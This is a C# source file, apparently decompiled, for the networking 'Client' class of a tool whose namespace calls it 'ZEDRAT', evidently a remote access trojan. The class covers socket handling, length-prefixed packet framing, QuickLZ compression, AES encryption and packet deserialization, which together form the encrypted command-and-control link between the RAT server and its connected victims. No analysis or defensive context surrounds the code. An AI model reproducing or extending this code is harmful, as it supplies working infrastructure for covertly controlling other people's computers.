using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using ZEDRatApp.ZEDRAT.Algorithm;
using ZEDRatApp.ZEDRAT.Compression;
using ZEDRatApp.ZEDRAT.Packets;

namespace ZEDRatApp.ZEDRAT.Networking
{
	public class Client : IEquatable<Client>
	{
		public delegate void ClientStateEventHandler(Client s, bool connected);

		public delegate void ClientReadEventHandler(Client s, IPacket packet);

		public delegate void ClientWriteEventHandler(Client s, IPacket packet, long length, byte[] rawData);

		public enum ReceiveType
		{
			Header = 0,
			Payload = 1
		}

		private Socket _handle;

		private readonly Queue<byte[]> _sendBuffers = new Queue<byte[]>();

		private bool _sendingPackets;

		private readonly object _sendingPacketsLock = new object();

		private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

		private bool _readingPackets;

		private readonly object _readingPacketsLock = new object();

		private int _readOffset;

		private int _writeOffset;

		private int _tempHeaderOffset;

		private int _readableDataLen;

		private int _payloadLen;

		private ReceiveType _receiveState;

		private readonly Server _parentServer;

		private byte[] _readBuffer;

		private byte[] _payloadBuffer;

		private byte[] _tempHeader;

		private bool _appendHeader;

		private const bool encryptionEnabled = true;

		private const bool compressionEnabled = true;

		public DateTime ConnectedTime { get; private set; }

		public bool Connected { get; private set; }

		public bool Authenticated { get; set; }

		public UserState Value { get; set; }

		public IPEndPoint EndPoint { get; private set; }

		public event ClientStateEventHandler ClientState;

		public event ClientReadEventHandler ClientRead;

		public event ClientWriteEventHandler ClientWrite;

		private void OnClientState(bool connected)
		{
			if (this.Connected != connected)
			{
				this.Connected = connected;
				this.ClientState?.Invoke(this, connected);
			}
		}

		private void OnClientRead(IPacket packet)
		{
			this.ClientRead?.Invoke(this, packet);
		}

		private void OnClientWrite(IPacket packet, long length, byte[] rawData)
		{
			this.ClientWrite?.Invoke(this, packet, length, rawData);
		}

		public bool Equals(Client c)
		{
			try
			{
				return this.EndPoint.Port.Equals(c.EndPoint.Port);
			}
			catch (Exception)
			{
				return false;
			}
		}

		public override bool Equals(object obj)
		{
			return this.Equals(obj as Client);
		}

		public override int GetHashCode()
		{
			return this.EndPoint.Port.GetHashCode();
		}

		public Client(Server parentServer, Socket socket)
		{
			try
			{
				this._parentServer = parentServer;
				this.Initialize();
				this._handle = socket;
				this._handle.SetKeepAliveEx(this._parentServer.KEEP_ALIVE_INTERVAL, this._parentServer.KEEP_ALIVE_TIME);
				this.EndPoint = (IPEndPoint)this._handle.RemoteEndPoint;
				this.ConnectedTime = DateTime.UtcNow;
				this._readBuffer = this._parentServer.BufferManager.GetBuffer();
				this._tempHeader = new byte[this._parentServer.HEADER_SIZE];
				this._handle.BeginReceive(this._readBuffer, 0, this._readBuffer.Length, SocketFlags.None, new AsyncCallback(AsyncReceive), null);
				this.OnClientState(connected: true);
			}
			catch (Exception)
			{
				this.Disconnect();
			}
		}

		private void Initialize()
		{
			this.Authenticated = false;
			this.Value = new UserState();
		}

		private void AsyncReceive(IAsyncResult result)
		{
			int num;
			try
			{
				num = this._handle.EndReceive(result);
				if (num <= 0)
				{
					throw new Exception("no bytes transferred");
				}
			}
			catch (NullReferenceException)
			{
				return;
			}
			catch (ObjectDisposedException)
			{
				return;
			}
			catch (Exception)
			{
				this.Disconnect();
				return;
			}
			this._parentServer.BytesReceived += num;
			byte[] array = new byte[num];
			try
			{
				Array.Copy(this._readBuffer, array, array.Length);
			}
			catch (Exception)
			{
				this.Disconnect();
				return;
			}
			lock (this._readBuffers)
			{
				this._readBuffers.Enqueue(array);
			}
			lock (this._readingPacketsLock)
			{
				if (!this._readingPackets)
				{
					this._readingPackets = true;
					ThreadPool.QueueUserWorkItem(new WaitCallback(AsyncReceive));
				}
			}
			try
			{
				this._handle.BeginReceive(this._readBuffer, 0, this._readBuffer.Length, SocketFlags.None, new AsyncCallback(AsyncReceive), null);
			}
			catch (ObjectDisposedException)
			{
			}
			catch (Exception)
			{
				this.Disconnect();
			}
		}

		private void AsyncReceive(object state)
		{
			while (true)
			{
				byte[] array;
				lock (this._readBuffers)
				{
					if (this._readBuffers.Count == 0)
					{
						lock (this._readingPacketsLock)
						{
							this._readingPackets = false;
							break;
						}
					}
					array = this._readBuffers.Dequeue();
				}
				this._readableDataLen += array.Length;
				bool flag = true;
				while (flag)
				{
					int num2;
					switch (this._receiveState)
					{
					case ReceiveType.Header:
						if (this._readableDataLen + this._tempHeaderOffset >= this._parentServer.HEADER_SIZE)
						{
							num2 = (this._appendHeader ? (this._parentServer.HEADER_SIZE - this._tempHeaderOffset) : this._parentServer.HEADER_SIZE);
							try
							{
								if (this._appendHeader)
								{
									try
									{
										Array.Copy(array, this._readOffset, this._tempHeader, this._tempHeaderOffset, num2);
									}
									catch (Exception)
									{
										flag = false;
										this.Disconnect();
										goto end_IL_00d8;
									}
									this._payloadLen = BitConverter.ToInt32(this._tempHeader, 0);
									this._tempHeaderOffset = 0;
									this._appendHeader = false;
								}
								else
								{
									this._payloadLen = BitConverter.ToInt32(array, this._readOffset);
								}
								if (this._payloadLen <= 0 || this._payloadLen > this._parentServer.MAX_PACKET_SIZE)
								{
									throw new Exception("invalid header");
								}
								goto IL_0175;
								end_IL_00d8:;
							}
							catch (Exception)
							{
								flag = false;
								this.Disconnect();
							}
						}
						else
						{
							try
							{
								Array.Copy(array, this._readOffset, this._tempHeader, this._tempHeaderOffset, this._readableDataLen);
							}
							catch (Exception)
							{
								flag = false;
								this.Disconnect();
								break;
							}
							this._tempHeaderOffset += this._readableDataLen;
							this._appendHeader = true;
							flag = false;
						}
						break;
					case ReceiveType.Payload:
						{
							if (this._payloadBuffer == null || this._payloadBuffer.Length != this._payloadLen)
							{
								this._payloadBuffer = new byte[this._payloadLen];
							}
							int num = ((this._writeOffset + this._readableDataLen >= this._payloadLen) ? (this._payloadLen - this._writeOffset) : this._readableDataLen);
							try
							{
								Array.Copy(array, this._readOffset, this._payloadBuffer, this._writeOffset, num);
							}
							catch (Exception)
							{
								flag = false;
								this.Disconnect();
								break;
							}
							this._writeOffset += num;
							this._readOffset += num;
							this._readableDataLen -= num;
							if (this._writeOffset == this._payloadLen)
							{
								bool flag2 = this._payloadBuffer.Length == 0;
								if (!flag2)
								{
									this._payloadBuffer = AES.Decrypt(this._payloadBuffer);
									flag2 = this._payloadBuffer.Length == 0;
								}
								if (!flag2)
								{
									try
									{
										this._payloadBuffer = SafeQuickLZ.Decompress(this._payloadBuffer);
									}
									catch (Exception)
									{
										flag = false;
										this.Disconnect();
										break;
									}
									flag2 = this._payloadBuffer.Length == 0;
								}
								if (flag2)
								{
									flag = false;
									this.Disconnect();
									break;
								}
								using (MemoryStream stream = new MemoryStream(this._payloadBuffer))
								{
									try
									{
										this.OnClientRead((IPacket)this._parentServer.Serializer.Deserialize(stream));
									}
									catch (Exception)
									{
										flag = false;
										this.Disconnect();
										break;
									}
								}
								this._receiveState = ReceiveType.Header;
								this._payloadBuffer = null;
								this._payloadLen = 0;
								this._writeOffset = 0;
							}
							if (this._readableDataLen == 0)
							{
								flag = false;
							}
							break;
						}
						IL_0175:
						this._readableDataLen -= num2;
						this._readOffset += num2;
						this._receiveState = ReceiveType.Payload;
						break;
					}
				}
				if (this._receiveState == ReceiveType.Header)
				{
					this._writeOffset = 0;
				}
				this._readOffset = 0;
				this._readableDataLen = 0;
			}
		}

		public void Send<T>(T packet) where T : IPacket
		{
			if (!this.Connected || packet == null)
			{
				return;
			}
			lock (this._sendBuffers)
			{
				using MemoryStream memoryStream = new MemoryStream();
				try
				{
					this._parentServer.Serializer.Serialize(memoryStream, packet);
				}
				catch (Exception)
				{
					this.Disconnect();
					return;
				}
				byte[] array = memoryStream.ToArray();
				this._sendBuffers.Enqueue(array);
				this.OnClientWrite(packet, array.LongLength, array);
				lock (this._sendingPacketsLock)
				{
					if (this._sendingPackets)
					{
						return;
					}
					this._sendingPackets = true;
				}
				ThreadPool.QueueUserWorkItem(new WaitCallback(Send));
			}
		}

		public void SendBlocking<T>(T packet) where T : IPacket
		{
			this.Send(packet);
			while (this._sendingPackets)
			{
				Thread.Sleep(10);
			}
		}

		private void Send(object state)
		{
			while (this.Connected)
			{
				byte[] payload;
				lock (this._sendBuffers)
				{
					if (this._sendBuffers.Count == 0)
					{
						this.SendCleanup();
						return;
					}
					payload = this._sendBuffers.Dequeue();
				}
				try
				{
					byte[] array = this.BuildPacket(payload);
					this._parentServer.BytesSent += array.Length;
					this._handle.Send(array);
				}
				catch (Exception)
				{
					this.Disconnect();
					this.SendCleanup(clear: true);
					return;
				}
			}
			this.SendCleanup(clear: true);
		}

		private byte[] BuildPacket(byte[] payload)
		{
			payload = SafeQuickLZ.Compress(payload);
			payload = AES.Encrypt(payload);
			byte[] array = new byte[payload.Length + this._parentServer.HEADER_SIZE];
			Array.Copy(BitConverter.GetBytes(payload.Length), array, this._parentServer.HEADER_SIZE);
			Array.Copy(payload, 0, array, this._parentServer.HEADER_SIZE, payload.Length);
			return array;
		}

		private void SendCleanup(bool clear = false)
		{
			lock (this._sendingPacketsLock)
			{
				this._sendingPackets = false;
			}
			if (!clear)
			{
				return;
			}
			lock (this._sendBuffers)
			{
				this._sendBuffers.Clear();
			}
		}

		public void Disconnect()
		{
			if (this._handle != null)
			{
				this._handle.Close();
				this._handle = null;
				this._readOffset = 0;
				this._writeOffset = 0;
				this._tempHeaderOffset = 0;
				this._readableDataLen = 0;
				this._payloadLen = 0;
				this._payloadBuffer = null;
				this._receiveState = ReceiveType.Header;
				if (this.Value != null)
				{
					this.Value.Dispose();
					this.Value = null;
				}
				this._parentServer.BufferManager.ReturnBuffer(this._readBuffer);
			}
			this.OnClientState(connected: false);
		}
	}
}
